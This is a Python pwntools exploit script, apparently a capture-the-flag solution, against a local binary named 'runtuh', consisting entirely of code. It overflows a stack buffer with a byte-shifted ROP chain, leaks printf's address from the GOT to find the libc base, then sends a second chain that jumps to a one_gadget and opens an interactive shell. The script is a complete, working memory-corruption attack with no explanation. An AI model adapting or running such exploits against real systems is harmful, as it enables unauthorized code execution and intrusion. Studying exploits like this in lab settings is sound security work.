

from pwn import *
import codecs

p = process('files/runtuh')

printf_plt = 0x4010d0
printf_got = 0x404020
pop_rdi = 0x0000000000401853
main = 0x401236
pop_5 = 0x00000000004016ed
pop_4 = 0x00000000004016ef
pop_rsi_r15_rbp = 0x00000000004016f2

def change_bytes(by):
	res = b''
	for i in by:
		res += bytes([(int(i)+0x30) & 0xff])
	return res

def new_p64(by):
	return change_bytes(p64(by).strip(b'\x00')).ljust(8, b"0")

payload = b'2 640'
p.sendline(payload)
sleep(1)
payload = b'0'*184 + change_bytes(b'\xe1\xd6').ljust(8, b"0") + new_p64(0)*6 + new_p64(pop_5) + new_p64(0)*5
payload += new_p64(pop_rdi) + new_p64(printf_got) + new_p64(printf_plt) + new_p64(pop_4) + new_p64(0)*4 + new_p64(main)
payload = payload.ljust(640, b'0')
p.sendline(payload)
sleep(1)
payload = b"1"*640
p.sendline(payload)


printf_leak = int(codecs.encode(p.recvuntil('\x7f')[-6:][::-1], 'hex'), 16)
libc_base = printf_leak - 0x064e10
one_gadget = libc_base + 0xe6ce9

payload = b'2 640'
p.sendline(payload)
sleep(1)
payload = b'0'*184 + new_p64(pop_rdi) + new_p64(0) + new_p64(pop_rsi_r15_rbp) + new_p64(0)*3 + new_p64(one_gadget)
payload = payload.ljust(640, b'0')
p.sendline(payload)
sleep(1)
payload = b"1"*640
p.sendline(payload)


p.interactive()
p.close()